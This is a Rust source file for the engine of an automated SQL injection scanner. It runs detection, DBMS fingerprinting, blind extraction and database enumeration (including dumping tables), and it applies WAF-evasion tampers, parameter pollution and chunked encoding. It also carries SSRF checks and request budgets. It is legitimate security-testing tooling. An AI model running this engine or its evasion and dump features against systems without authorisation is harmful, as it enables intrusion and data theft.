#![deny(unsafe_code)]

use crate::{
    dbms::context::{DbmsBelief, InjectionContext},
    detection::{
        baseline,
        scanner::scheduler::{
            EarlyStop, RequestBudget, Scheduler, cost_for, cost_for_with_ttfb,
            ensure_union_starvation_guard, evi_for,
        },
    },
    error::InjektError,
    http::client::{HttpClient, RequestSpec},
    http::timeouts::RequestClass,
    reasoning::{
        Hypothesis,
        knowledge::{KnowledgeStore, normalize_dbms, scheduled_boost_for},
    },
    session::{
        scrubber::Scrubber,
        state::{Finding, SessionState, TechniqueKind},
    },
    target::{
        markers::MarkerSet,
        parameters::{ParameterLocation, TargetParameter},
        raw_request::RawRequest,
        url::TargetUrl,
    },
    techniques::{
        boolean::{detector::BooleanDetector, payloads::boolean_payloads_for},
        error::detector::ErrorDetector,
        json::{
            detector::JsonDetector,
            payloads::{JsonPayload, graphql_probes_for, json_payloads_for},
        },
        nosql::{detector::NosqlDetector, payloads::nosql_payloads},
        oob::{
            detector::OobDetector,
            payloads::{is_valid_oob_domain, new_token, oob_payloads_for},
        },
        payload_opts::{PayloadOpts, build_final_payload_with_rng, encode_with_safe_chars},
        request_tamper::{hpp_body_str, hpp_query_url, should_apply_chunked},
        stacked::{detector::StackedDetector, payloads::stacked_payloads_for},
        tamper::{Tamper, boolean_safe_transformation_sets, tamper_transformation_sets},
        time::{detector::TimeDetector, payloads::all_time_payloads},
        union::{detector::UnionDetector, payloads::union_payloads_for},
    },
};
use futures::StreamExt as _;
use http::Method;
use indicatif::{ProgressBar, ProgressStyle};
use std::{collections::HashMap, io::IsTerminal as _, sync::Arc, time::Instant};
use tokio::sync::RwLock;
use tokio_util::sync::CancellationToken;
use tracing::{debug, info, warn};

/// Spinner hidden when stderr is not a TTY (MCP stdio, pipes, CI).
/// `indicatif` writes to stderr, so stdout JSON-RPC stays clean, but hidden
/// avoids spam + steady-tick CPU in agent mode.
fn spinner(msg: &str) -> ProgressBar {
    if !std::io::stderr().is_terminal() {
        return ProgressBar::hidden();
    }
    let pb = ProgressBar::new_spinner();
    pb.set_style(
        ProgressStyle::default_spinner()
            .template("{spinner} {msg}")
            .unwrap_or_else(|_| ProgressStyle::default_spinner()),
    );
    pb.set_message(msg.to_owned());
    pb.enable_steady_tick(std::time::Duration::from_millis(80));
    pb
}

fn progress_bar(len: u64) -> ProgressBar {
    if !std::io::stderr().is_terminal() {
        return ProgressBar::hidden();
    }
    let pb = ProgressBar::new(len);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{bar:40} {pos}/{len} {msg}")
            .unwrap_or_else(|_| ProgressStyle::default_bar()),
    );
    pb
}

/// Filter testable parameters by `-p` selection (case-insensitive).
/// Accepts bare names (`id`), `location:name` (`body:user`,
/// `cookie:PHPSESSID`, `header:X-Forwarded-For`) or full keys (`id@query`).
/// Empty filter returns all params. Marker synthetics are always preserved
/// when markers are present.
#[must_use]
pub fn filter_params(params: Vec<TargetParameter>, filter: &[String]) -> Vec<TargetParameter> {
    if filter.is_empty() {
        return params;
    }
    let lowered: Vec<String> = filter
        .iter()
        .map(|s| s.trim().to_ascii_lowercase())
        .filter(|s| !s.is_empty())
        .collect();
    if lowered.is_empty() {
        return params;
    }
    params
        .into_iter()
        .filter(|p| {
            if p.name.starts_with("marker_") {
                return true;
            }
            let name_l = p.name.to_ascii_lowercase();
            let key_l = p.key().to_ascii_lowercase();
            lowered.iter().any(|f| {
                // Bare name (`id`) or full key (`id@query`, `x@header:y`).
                if f == &name_l || f == &key_l {
                    return true;
                }
                // `location:name` form (e.g. `body:user`, `cookie:PHPSESSID`).
                let Some((loc, n)) = f.split_once(':') else {
                    return false;
                };
                match &p.location {
                    ParameterLocation::Header(h) => {
                        // `header:X-Forwarded-For` matches header params by
                        // header name; full `header:h` display also accepted.
                        loc == "header" && (name_l == n || h.to_ascii_lowercase() == n)
                    }
                    other => other.to_string().to_ascii_lowercase() == loc && name_l == n,
                }
            })
        })
        .collect()
}

/// Number of base payloads to try per technique for a tuning `--level`.
/// L1 is the historical budget (byte-identical default), L2 doubles it,
/// L3+ exhausts the whole list. Pure and unit-testable.
#[must_use]
pub fn payload_budget(level: u8, default_take: usize, total: usize) -> usize {
    match level {
        // 0 is unreachable via CLI (clap range 1..=5); treated as L1 defensively.
        0 | 1 => default_take.min(total),
        2 => (default_take * 2).min(total),
        _ => total,
    }
}

/// `--ignore-code`: a response status listed in `codes` is treated as a
/// negative probe (never a finding). The baseline (including WAF detection)
/// runs before this filter and is never ignored.
#[must_use]
pub fn is_ignored(status: u16, codes: &[u16]) -> bool {
    codes.contains(&status)
}

/// App-level signature filter status (e.g. bench A1 `400 {"error":"invalid
/// parameter"}` on spaced keywords). Distinct from WAF `403`/`406` (see
/// `Baseline::is_waf_blocked`): the baseline sees clean `200`s so no
/// auto-tamper fires, yet every spaced boolean payload returns `400`/`400`.
/// Callers use this to prune the payload loop early instead of burning the
/// full L3 matrix on an obviously filtered sink. Narrow to `400`/`400` only
/// so N1/N2 (`200`) and WAF blocks (`403`/`406`) never trip it.
pub const APP_FILTER_STATUS: u16 = 400;
/// Consecutive fully-filtered `(payload, tamper-set)` probes before pruning.
pub const FILTER_STREAK_LIMIT: usize = 3;

#[must_use]
pub const fn is_app_filter_block(true_status: u16, false_status: u16) -> bool {
    true_status == APP_FILTER_STATUS && false_status == APP_FILTER_STATUS
}

/// `true` when every baseline sample is a server error (5xx: origin down,
/// CF 520–524, …). Detection differentials against error pages are
/// meaningless (static pages refute everything), so the caller warns loudly
/// instead of burning hundreds of probes silently. Empty = `false`
/// (no samples is a different failure, handled upstream). Pure and
/// unit-testable.
#[must_use]
pub fn baseline_all_error(statuses: &[u16]) -> bool {
    !statuses.is_empty() && statuses.iter().all(|s| (500..600).contains(s))
}

/// Mid-technique `--max-duration` check for the long per-technique loops
/// (boolean payloads, ORDER BY enumeration, union matrix). Warns
/// (operator-visible, once per trip — callers stop right after) and returns
/// `true` when the shared deadline has passed so the technique ends early
/// and its outcome folds normally. `None` deadline = unlimited no-op.
fn check_deadline(deadline: Option<std::time::Instant>, param: &str, technique: &str) -> bool {
    if BudgetConfig::is_past_deadline(deadline) {
        warn!(
            param,
            technique, "max-duration exceeded inside probes, stopping technique early"
        );
        return true;
    }
    false
}

/// Auto-tampers applied when a blocking WAF is seen and the user gave none:
/// `space2comment` (space-signature bypass) + `randomcase` (case-signature
/// bypass, 429 rate-limit hardening). Pure and unit-testable. HPP/chunked
/// are never auto-enabled (request-shape changes stay explicit opt-in).
#[must_use]
pub fn waf_auto_tampers() -> Vec<Tamper> {
    vec![Tamper::Space2Comment, Tamper::RandomCase]
}

/// Resolve the effective tamper set for a run: the WAF auto-pair when
/// `waf_blocking` fired and the user gave none, otherwise the user set
/// unchanged (explicit `--tamper` always wins). Pure and unit-testable.
#[must_use]
pub fn resolve_effective_tampers(waf_blocking: bool, user_tampers: &[Tamper]) -> Vec<Tamper> {
    if waf_blocking && user_tampers.is_empty() {
        waf_auto_tampers()
    } else {
        user_tampers.to_vec()
    }
}

/// Build a synthetic raw request from `--data` so body params are preserved
/// through baseline + injection (same path as `--raw-file`).
/// Uses [`sniff_kind`] from `target::structured` for robust content-type
/// detection: checks `Content-Type` first, then falls back to body shape
/// (`{` → JSON, `<` → XML, else → urlencoded).
#[must_use]
pub fn synthetic_raw_from_data(data: &str) -> Option<RawRequest> {
    use crate::target::structured::sniff_kind;
    let trimmed = data.trim();
    if trimmed.is_empty() {
        return None;
    }
    let kind = sniff_kind(None, trimmed);
    let content_type = match kind {
        crate::target::structured::StructuredKind::Json => "application/json",
        crate::target::structured::StructuredKind::Xml => "application/xml",
        _ => "application/x-www-form-urlencoded",
    };
    let mut headers = HashMap::new();
    headers.insert("Content-Type".to_owned(), content_type.to_owned());
    Some(RawRequest {
        method: "POST".to_owned(),
        path: "/".to_owned(),
        headers,
        body: Some(trimmed.to_owned()),
        http_version: "HTTP/1.1".to_owned(),
    })
}

#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum EngineState {
    Parse,
    Baseline,
    Context,
    Detection,
    Fingerprint,
    Extraction,
    Enumeration,
    Done,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[non_exhaustive]
pub struct BudgetConfig {
    pub threads: usize,
    pub level: u8,
    pub request_budget: Option<usize>,
    /// Global detection time budget in seconds (Phase 3 `--max-duration`).
    /// `None` (default) = unlimited, historical behaviour byte-identical.
    /// SCOPE: detection phase only (clock starts in `run_detection` after
    /// baseline + context); never bounds the total run. OPT-IN hors
    /// profils/config-file (CLI/env only, range `0..=86400` enforced at parse).
    pub max_duration_secs: Option<u64>,
}

impl Default for BudgetConfig {
    fn default() -> Self {
        Self {
            threads: 5,
            level: 1,
            request_budget: None,
            max_duration_secs: None,
        }
    }
}

/// Cap for `--max-duration` (24h). MUST stay consistent with
/// `crate::cli::args::MAX_DURATION_SECS` (kept local: `cli::args` depends on
/// this module via `synthetic_raw_from_data`, so importing it here would
/// cycle). The CLI rejects larger values at parse time; programmatic
/// `BudgetConfig` values above it are clamped in
/// [`BudgetConfig::detection_deadline`].
pub const MAX_DETECTION_DURATION_SECS_CAP: u64 = 86_400;

impl BudgetConfig {
    /// `true` once `started` exceeds the configured `max_duration_secs`.
    /// `None` (default) never trips. Pure and unit-testable.
    ///
    /// SCOPE (PR20): `started` is the *detection* clock (set once in
    /// `run_detection`, AFTER baseline + context) — this never bounds the
    /// total run, only the detection loops. Compared as `Duration`
    /// (sub-second precision), not `as_secs()` truncation.
    #[must_use]
    pub fn is_over_max_duration(
        started: std::time::Instant,
        max_duration_secs: Option<u64>,
    ) -> bool {
        let Some(max) = max_duration_secs else {
            return false;
        };
        started.elapsed() >= std::time::Duration::from_secs(max)
    }

    /// Shared `--max-duration` deadline for mid-technique checks.
    /// `None` (default) = unlimited: every `is_past_deadline` call is a
    /// no-op and detection stays byte-identical. Pure and unit-testable.
    ///
    /// Overflow (PR20): `checked_add` returns `None` on overflow, which would
    /// conflate an explicit huge budget with "unlimited" (silent fail-open).
    /// User input can never reach it — the CLI rejects `> 86400s` at parse
    /// time (`crate::cli::args::MAX_DURATION_SECS`, mirrored as
    /// `MAX_DETECTION_DURATION_SECS_CAP` below since `cli` depends on this
    /// module and cannot be imported here). Programmatic values are clamped
    /// to that cap first, so `checked_add` only returns `None` in the
    /// pathological case of an `Instant` within one day of its maximum
    /// (practically unreachable): there `None` = effectively-infinite
    /// deadline, documented here rather than silent.
    #[must_use]
    pub fn detection_deadline(
        started: std::time::Instant,
        max_duration_secs: Option<u64>,
    ) -> Option<std::time::Instant> {
        let max = max_duration_secs?;
        let capped = max.min(MAX_DETECTION_DURATION_SECS_CAP);
        started.checked_add(std::time::Duration::from_secs(capped))
    }

    /// `true` once the shared `--max-duration` deadline has passed.
    /// `None` = unlimited (never trips). Pure and unit-testable.
    #[must_use]
    pub fn is_past_deadline(deadline: Option<std::time::Instant>) -> bool {
        deadline.is_some_and(|d| std::time::Instant::now() >= d)
    }

    /// `true` once the shared `request_count` reaches `request_budget`.
    /// `None` (default) never trips: historical behaviour byte-identical
    /// (A1 evasion needs ~1032 req live — no default cap, ever).
    ///
    /// CODE calibration (`--request-budget N`, OPT-IN): the per-parameter
    /// scheduler already caps each param at the same value via
    /// [`RequestBudget::max_requests`], but schedulers are per-param
    /// instances — only this check against the shared
    /// `SessionState::request_count` is a true global plafond. Cooperative:
    /// the running technique finishes, no new one starts, the run ends in
    /// clean [`EngineState::Done`] (never an error, never a new finding).
    /// Concurrent params may overshoot by one technique each.
    /// Pure and unit-testable.
    #[must_use]
    pub fn is_over_request_budget(request_count: u64, request_budget: Option<usize>) -> bool {
        let Some(max) = request_budget else {
            return false;
        };
        u64::try_from(max).is_ok_and(|m| request_count >= m)
    }
}

#[derive(Debug, Clone, Default)]
#[non_exhaustive]
pub struct EvasionConfig {
    pub payload_opts: crate::techniques::payload_opts::PayloadOpts,
    pub tampers: Vec<crate::techniques::tamper::Tamper>,
    pub hpp: bool,
    pub chunked: bool,
}

#[derive(Debug, Clone, Default)]
#[non_exhaustive]
pub struct NetConfig {
    pub allow_private: bool,
    pub remote_dns: bool,
    pub ignore_codes: Vec<u16>,
    pub method_override: Option<String>,
}

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct OobConfig {
    pub oob_domain: Option<String>,
    pub oob_poll_url: Option<String>,
    pub oob_wait_secs: u64,
}

impl Default for OobConfig {
    fn default() -> Self {
        Self {
            oob_domain: None,
            oob_poll_url: None,
            oob_wait_secs: 5,
        }
    }
}

/// Option B second-order actif borné (lab only, même-origine).
///
/// `enabled=false` (défaut) = 0 requête extra, chemin byte-identique.
/// `enabled=true` = `run_second_order()` stocke un marqueur bénin
/// (`u+8hex`, payload `'<marker>'` style union, jamais de RCE/stacked)
/// sur ≤`max_stores` params Body/Query/Header puis revisite `revisit_url`
/// (même-origine uniquement, max 2 GET séquentiels, `RequestClass::Default`).
/// Les headers (`User-Agent`/`X-Forwarded-For`/`Referer`, souvent loggés en
/// base sans sanitisation) sont couverts comme les Body/Query.
#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct SecondOrderConfig {
    pub enabled: bool,
    pub revisit_url: Option<String>,
    pub max_stores: usize,
}

impl Default for SecondOrderConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            revisit_url: None,
            max_stores: 8,
        }
    }
}

impl SecondOrderConfig {
    /// Borne effective `1..=32` (défense en profondeur si construit à la main).
    /// `&self` (pas `const`): le struct porte des `String` (`Drop`), donc
    /// `const fn` par valeur est rejeté par le compilateur.
    #[must_use]
    pub fn effective_max_stores(&self) -> usize {
        self.max_stores.clamp(1, 32)
    }
}

#[derive(Debug, Clone, Default)]
#[allow(clippy::struct_excessive_bools)]
#[non_exhaustive]
pub struct EnumConfig {
    pub extract: bool,
    pub dbs: bool,
    pub tables: bool,
    pub columns: bool,
    pub dump: bool,
    pub banner: bool,
    pub current_user: bool,
    pub current_db: bool,
    pub hostname: bool,
    pub db: Option<String>,
    pub table: Option<String>,
    pub column: Option<String>,
    pub start: Option<usize>,
    pub stop: Option<usize>,
    pub count: bool,
}

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct EngineConfig {
    pub budget: BudgetConfig,
    pub evasion: EvasionConfig,
    pub net: NetConfig,
    pub oob: OobConfig,
    pub enumeration: EnumConfig,
    pub second_order: SecondOrderConfig,

    pub techniques: Vec<String>,
    pub test_params: Vec<String>,
    pub post_data: Option<String>,
    pub matcher: crate::detection::matcher::MatcherConfig,
    pub confirm: bool,
    pub seed: Option<u64>,
    /// C5-tardif escape hatch (`--no-mutation`): when `true`, the
    /// confirm-second-pass mini-mutation is fully skipped (0 extra request,
    /// 0 trace record). Default `false` = mutation ON but strictly scoped
    /// (confirmed findings only, ≤4 variants / ≤8 req per finding).
    pub no_mutation: bool,
    /// `--explain <param>`: after the run, print the one-line reasoning
    /// verdict for the matching finding (`id@query`). `None` = no explain.
    pub explain: Option<String>,
    pub no_redact: bool,
    pub dbms_hint: Option<String>,
    pub marker: Option<String>,
    pub raw_request: Option<RawRequest>,
    /// C13 Knowledge Engine (opt-in) : `None` = OFF, RAM-only, boost `1.0`
    /// neutre (chemin byte-identique au sans-knowledge). `Some(store)` =
    /// snapshot lu au boot (`--allow-knowledge`), boost `1+alpha` borné
    /// `[0.5,1.5]` puis clamp scheduler `[0.5,2.0]` (jamais de veto).
    pub knowledge: Option<KnowledgeStore>,
}

impl EngineConfig {
    #[must_use]
    pub fn test_defaults() -> Self {
        let mut cfg = Self::default();
        cfg.budget.threads = 1;
        cfg.net.allow_private = true;
        cfg.no_redact = true;
        cfg
    }
}

/// Request-level evasion options, threaded alongside string [`Tamper`]s.
///
/// `Copy` so detection workers and extraction oracles can capture it cheaply.
#[derive(Debug, Clone, Copy, Default)]
#[non_exhaustive]
pub struct ProbeOpts {
    /// HTTP Parameter Pollution: duplicate `?id=1&id=<PAYLOAD>` (Query/Body).
    pub hpp: bool,
    /// Chunked transfer: `Transfer-Encoding: chunked` streaming body (Body only).
    pub chunked: bool,
}

impl ProbeOpts {
    #[must_use]
    pub const fn new(hpp: bool, chunked: bool) -> Self {
        Self { hpp, chunked }
    }

    #[must_use]
    pub const fn is_active(self) -> bool {
        self.hpp || self.chunked
    }

    /// Short evidence suffix, e.g. `" hpp=true chunked=false"`, or `""` when inactive.
    #[must_use]
    pub fn evidence_suffix(self) -> String {
        if !self.is_active() {
            return String::new();
        }
        format!(" hpp={} chunked={}", self.hpp, self.chunked)
    }
}

impl Default for EngineConfig {
    fn default() -> Self {
        Self {
            budget: BudgetConfig::default(),
            evasion: EvasionConfig::default(),
            net: NetConfig::default(),
            oob: OobConfig::default(),
            enumeration: EnumConfig::default(),
            second_order: SecondOrderConfig::default(),
            techniques: vec![
                "boolean".to_owned(),
                "time".to_owned(),
                "error".to_owned(),
                "union".to_owned(),
            ],
            test_params: Vec::new(),
            post_data: None,
            matcher: crate::detection::matcher::MatcherConfig::default(),
            confirm: false,
            seed: None,
            no_mutation: false,
            explain: None,
            no_redact: false,
            dbms_hint: None,
            marker: None,
            raw_request: None,
            knowledge: None,
        }
    }
}

#[derive(Debug)]
#[non_exhaustive]
pub struct Engine {
    config: EngineConfig,
    client: HttpClient,
    state: Arc<RwLock<SessionState>>,
    cancel: CancellationToken,
    scrubber: Scrubber,
    baseline_cache: Option<Arc<crate::recon::BaselineCache>>,
}

/// Outcome of one concurrent baseline fetch (Phase 3, `join_all` borné).
/// `BodyReadFailed` (compté, retry) vs `TransportFailed` (non compté, retry)
/// préserve la comptabilité historique ; `Cancelled` sort proprement.
enum BaselineOutcome {
    Sample(baseline::Sample),
    BodyReadFailed,
    TransportFailed(String),
    Cancelled,
}

impl Engine {
    #[must_use]
    pub fn new(config: EngineConfig, client: HttpClient, cancel: CancellationToken) -> Self {
        let scrubber = Scrubber::new(config.no_redact);
        let mut initial = SessionState::new();
        initial.set_seed(config.seed);
        Self {
            config,
            client,
            state: Arc::new(RwLock::new(initial)),
            cancel,
            scrubber,
            baseline_cache: None,
        }
    }

    #[must_use]
    pub fn with_baseline_cache(mut self, cache: Arc<crate::recon::BaselineCache>) -> Self {
        self.baseline_cache = Some(cache);
        self
    }

    #[must_use]
    pub fn state_handle(&self) -> Arc<RwLock<SessionState>> {
        Arc::clone(&self.state)
    }

    /// # Errors
    /// Returns an error if the target URL fails to parse, or a network/detection
    /// phase fails unrecoverably.
    pub async fn run(&self, target_str: &str) -> crate::error::Result<EngineState> {
        self.run_internal(target_str, None).await
    }

    /// # Errors
    /// Returns an error if the candidate URL fails to parse, or a network/detection
    /// phase fails unrecoverably.
    pub async fn run_candidate(
        &self,
        candidate: &crate::recon::ParameterCandidate,
    ) -> crate::error::Result<EngineState> {
        self.run_internal(candidate.url.as_str(), Some(candidate))
            .await
    }

    #[allow(clippy::too_many_lines)]
    async fn run_internal(
        &self,
        target_str: &str,
        candidate: Option<&crate::recon::ParameterCandidate>,
    ) -> crate::error::Result<EngineState> {
        let mut current = EngineState::Parse;
        let run_started = Instant::now();
        info!(target=%self.scrubber.scrub(target_str), state=?current, "engine start");

        // `--confirm` strict second-pass (C6): re-sonde every confirmed finding
        // with fresh payloads + derived seed after detection (OOB excluded).
        // In-detection 3-trial confirmation still applies regardless.
        if self.config.confirm {
            info!("--confirm second-pass enabled (fresh payloads, derived seed, OOB excluded)");
        }

        // Parse (lexical) + DNS-time SSRF check (anti DNS-rebinding).
        // Skipped when the proxy does remote DNS (`socks5h://`): a local
        // `lookup_host` would leak the hostname and fail `.onion` names the
        // proxy could resolve. Lexical + IP-literal checks in `parse` still apply.
        let target = TargetUrl::parse(target_str, self.config.net.allow_private)
            .map_err(|e| crate::error::InjektError::Other(Box::new(e)))?;
        if !self.config.net.allow_private
            && !self.config.net.remote_dns
            && let Some(host) = target.inner().host_str()
        {
            TargetUrl::resolve_and_check(host, false)
                .await
                .map_err(|e| crate::error::InjektError::Other(Box::new(e)))?;
        }
        current = EngineState::Baseline;
        info!(
            target=%self.scrubber.scrub(target_str),
            state=?current,
            "phase baseline"
        );

        if self.cancel.is_cancelled() {
            self.absorb_detectability().await;
            return Ok(EngineState::Done);
        }

        let candidate_param = candidate.map(crate::recon::ParameterCandidate::target_parameter);
        let raw_request = self.build_raw_request(candidate);

        let Some((baseline, effective_tampers, effective_opts)) =
            self.collect_baseline(&target, raw_request.as_ref()).await?
        else {
            self.absorb_detectability().await;
            return Ok(EngineState::Done);
        };

        current = EngineState::Context;
        info!(
            target=%self.scrubber.scrub(target_str),
            state=?current,
            "phase context"
        );

        let (marker_set, to_test) = self.select_params(
            target_str,
            &target,
            raw_request.as_ref(),
            candidate_param.as_ref(),
        );
        let raw_request = Arc::new(raw_request);

        // Run adaptive context analysis (<=8 requests bound, 0 DBMS probes if --dbms)
        let context_started = Instant::now();
        let context_req_before = self.state.read().await.request_count();
        let primary_param = to_test.first();
        let context_result = if let Some(param) = primary_param {
            crate::dbms::context::analyze_context(
                &self.client,
                &self.state,
                &self.cancel,
                &target,
                param,
                raw_request.as_ref().as_ref(),
                &baseline,
                self.config.dbms_hint.as_deref(),
            )
            .await
        } else {
            crate::dbms::context::ContextProbeResult {
                context: crate::dbms::context::InjectionContext::new(),
                dbms_belief: self.config.dbms_hint.as_deref().map_or_else(
                    crate::dbms::context::DbmsBelief::uniform,
                    crate::dbms::context::DbmsBelief::from_hint,
                ),
                probes_sent: 0,
                error_evidence: None,
            }
        };

        let context_elapsed = context_started.elapsed().as_secs_f64();
        let context_req_delta = self
            .state
            .read()
            .await
            .request_count()
            .saturating_sub(context_req_before);
        info!(
            target=%self.scrubber.scrub(target_str),
            context=%context_result.context.summary(),
            probes=context_result.probes_sent,
            elapsed_s=context_elapsed,
            requests=context_req_delta,
            "context done in {context_elapsed:.1}s ({context_req_delta} req) — {}",
            context_result.context.summary(),
        );

        let (top_dbms, prob) = context_result.dbms_belief.top_candidate();
        if prob >= 0.85 && top_dbms != crate::dbms::common::DbmsKind::Unknown {
            self.state.write().await.fill_missing_dbms(top_dbms);
            info!(%top_dbms, confidence=%prob, "DBMS identified early during context analysis");
        }

        current = EngineState::Detection;
        info!(
            target=%self.scrubber.scrub(target_str),
            state=?current,
            "phase detection"
        );

        let detection_started = Instant::now();
        let detection_req_before = self.state.read().await.request_count();
        // Clone borné pour Option B second-order (Body/Query, ≤max_stores) :
        // `run_detection` consomme `to_test`, le clone préserve la liste
        // filtrée `-p` pour `run_second_order` sans refaire `select_params`.
        let to_test_for_second_order = to_test.clone();
        self.run_detection(
            &target,
            target_str,
            &marker_set,
            &raw_request,
            &baseline,
            &effective_tampers,
            &context_result.context,
            &context_result.dbms_belief,
            context_result.probes_sent,
            to_test,
        )
        .await;
        {
            let detection_elapsed = detection_started.elapsed().as_secs_f64();
            let detection_req_delta = self
                .state
                .read()
                .await
                .request_count()
                .saturating_sub(detection_req_before);
            let detection_findings = self.state.read().await.findings().len();
            info!(
                elapsed_s = detection_elapsed,
                requests = detection_req_delta,
                findings = detection_findings,
                "detection done in {detection_elapsed:.1}s ({detection_req_delta} req, {detection_findings} findings)"
            );
        }

        // C6 `--confirm` second-pass: re-sonde every confirmed finding with
        // fresh payloads + derived seed (OOB excluded, ~2x req documented).
        // Never creates new findings — only drops those that fail re-validation
        // (0 new FP on N1/N2 by construction).
        if self.config.confirm {
            self.run_confirm_second_pass(
                &target,
                target_str,
                &marker_set,
                &raw_request,
                &baseline,
                &effective_tampers,
                effective_opts,
                &context_result.context,
            )
            .await;
        }

        // Option B second-order actif borné (lab only, même-origine) :
        // APRÈS `run_confirm_second_pass`, AVANT `run_fingerprint`.
        // OFF par défaut = 0 requête extra (chemin byte-identique).
        if self.config.second_order.enabled {
            self.run_second_order(
                &target,
                target_str,
                &to_test_for_second_order,
                &marker_set,
                &raw_request,
                &baseline,
            )
            .await?;
        }

        // `--explain <param>`: one-line reasoning verdict after the run.
        if let Some(wanted) = self.config.explain.clone() {
            let st = self.state.read().await;
            if let Some(line) = st.explain(&wanted) {
                info!(param=%wanted, explain=%line, "--explain");
            } else {
                warn!(param=%wanted, "no finding matches --explain");
            }
        }

        current = EngineState::Fingerprint;
        info!(
            target=%self.scrubber.scrub(target_str),
            state=?current,
            "phase fingerprint"
        );
        let fingerprint_started = Instant::now();
        let fingerprint_req_before = self.state.read().await.request_count();
        self.run_fingerprint(
            &target,
            target_str,
            &marker_set,
            &raw_request,
            &baseline,
            &effective_tampers,
            effective_opts,
        )
        .await;
        {
            let fingerprint_elapsed = fingerprint_started.elapsed().as_secs_f64();
            let fingerprint_req_delta = self
                .state
                .read()
                .await
                .request_count()
                .saturating_sub(fingerprint_req_before);
            if fingerprint_req_delta == 0 {
                info!("fingerprint skipped (no confirmed findings, 0 req)");
            } else {
                info!(
                    elapsed_s = fingerprint_elapsed,
                    requests = fingerprint_req_delta,
                    "fingerprint done in {fingerprint_elapsed:.1}s ({fingerprint_req_delta} req)"
                );
            }
        }

        if self.config.enumeration.extract {
            // Gate early (same rule as enumeration): no finding => no oracle.
            // Prevents hundreds of blind requests on a clean target, in
            // particular with `--auto-enumerate`.
            let snap = self.state.read().await.findings().to_vec();
            if snap.is_empty() {
                warn!(
                    target=%self.scrubber.scrub(target_str),
                    "--extract requested but no confirmed vulnerability was found — skipping"
                );
            } else if !is_extraction_eligible(&snap) {
                warn!(
                    target=%self.scrubber.scrub(target_str),
                    "likely FP, extraction skipped (no boolean-confirmed or error-with-fragment finding)"
                );
            } else {
                current = EngineState::Extraction;
                info!(
                    target=%self.scrubber.scrub(target_str),
                    state=?current,
                    "phase extraction — inference (opt-in)"
                );
                self.run_extraction(
                    &target,
                    target_str,
                    &marker_set,
                    &raw_request,
                    &baseline,
                    &effective_tampers,
                    effective_opts,
                )
                .await?;
            }
        }

        // Enumeration phase (--dbs, --tables, --columns, --dump, --count,
        // --banner, --current-user, --current-db, --hostname). Requires a
        // *boolean-capable* finding (same bar as extraction): the enumerator
        // runs a boolean-differential oracle, so stacked/time/union-only
        // snapshots would chase noise into `inference inconsistency` errors
        // after burning a full oracle pass per candidate.
        let needs_enum = self.config.enumeration.dbs
            || self.config.enumeration.tables
            || self.config.enumeration.columns
            || self.config.enumeration.dump
            || self.config.enumeration.count
            || self.config.enumeration.banner
            || self.config.enumeration.current_user
            || self.config.enumeration.current_db
            || self.config.enumeration.hostname;
        let snap_for_enum = self.state.read().await.findings().to_vec();
        let enum_eligible = is_extraction_eligible(&snap_for_enum);
        if needs_enum && enum_eligible {
            current = EngineState::Enumeration;
            info!(
                target=%self.scrubber.scrub(target_str),
                state=?current,
                "phase enumeration — dbs/tables/columns/dump"
            );
            self.run_enumeration(
                &target,
                target_str,
                &marker_set,
                &raw_request,
                &baseline,
                &effective_tampers,
                effective_opts,
            )
            .await?;
        } else if needs_enum && snap_for_enum.is_empty() {
            warn!(
                target=%self.scrubber.scrub(target_str),
                "enumeration requested but no confirmed vulnerability was found"
            );
        } else if needs_enum {
            warn!(
                target=%self.scrubber.scrub(target_str),
                "likely FP, enumeration skipped (no boolean-capable finding: stacked/time-only cannot feed the oracle)"
            );
        }

        current = EngineState::Done;
        // C10: absorb every throttled hop (403/429, incl. retried 429s) into
        // the run's detectability counters before reporting.
        self.absorb_detectability().await;
        let requests = self.state.read().await.request_count();
        let detectability = self.state.read().await.detectability();
        let findings_snapshot = self.state.read().await.findings().to_vec();
        let total_elapsed = run_started.elapsed().as_secs_f64();
        // Findings per technique for the one-line summary (e.g. `boolean×1,
        // error×1`). Sorted for deterministic output.
        let mut by_technique: HashMap<String, usize> = HashMap::new();
        for finding in &findings_snapshot {
            *by_technique
                .entry(finding.technique.to_string())
                .or_insert(0) += 1;
        }
        let mut technique_parts: Vec<String> = by_technique
            .iter()
            .map(|(tech, count)| format!("{tech}×{count}"))
            .collect();
        technique_parts.sort();
        let findings_detail = if technique_parts.is_empty() {
            "no findings".to_owned()
        } else {
            format!(
                "{} finding(s) ({})",
                findings_snapshot.len(),
                technique_parts.join(", ")
            )
        };
        if findings_snapshot.is_empty() {
            info!(
                target=%self.scrubber.scrub(target_str),
                state=?current,
                requests,
                findings = 0,
                elapsed_s = total_elapsed,
                count_403 = detectability.count_403,
                count_429 = detectability.count_429,
                "scan done: {findings_detail}, {requests} req in {total_elapsed:.1}s (403×{} 429×{})",
                detectability.count_403,
                detectability.count_429,
            );
        } else {
            info!(
                target=%self.scrubber.scrub(target_str),
                state=?current,
                requests,
                findings = findings_snapshot.len(),
                elapsed_s = total_elapsed,
                count_403 = detectability.count_403,
                count_429 = detectability.count_429,
                "scan done: {findings_detail}, {requests} req in {total_elapsed:.1}s (403×{} 429×{}) — try --explain <param> for reasoning",
                detectability.count_403,
                detectability.count_429,
            );
        }
        Ok(current)
    }

    /// Drain the [`HttpClient`] throttle counters into the run's
    /// detectability counters (C10, bench Annexe A). Take-semantics: each run
    /// is absorbed exactly once, even if the client is reused across runs.
    async fn absorb_detectability(&self) {
        let (c403, c429) = self.client.take_detectability_counts();
        if c403 != 0 || c429 != 0 {
            self.state.write().await.add_detectability(c403, c429);
        }
    }

    /// Fused raw request: `EngineConfig::raw_request` (`--raw-file` + CLI
    /// overlays) wins, then the recon-candidate synthetic, then `--data`.
    /// A bare `--method` without any body is carried as a method-only raw so
    /// baseline + injection preserve it instead of falling back to `GET`.
    fn build_raw_request(
        &self,
        candidate: Option<&crate::recon::ParameterCandidate>,
    ) -> Option<RawRequest> {
        if let Some(mut raw) = self.config.raw_request.clone() {
            if let Some(m) = self.config.net.method_override.as_deref() {
                let m = m.trim();
                if !m.is_empty() {
                    raw.method = m.to_ascii_uppercase();
                }
            }
            return Some(raw);
        }
        let cli_raw_request = candidate.map(crate::recon::ParameterCandidate::raw_request);
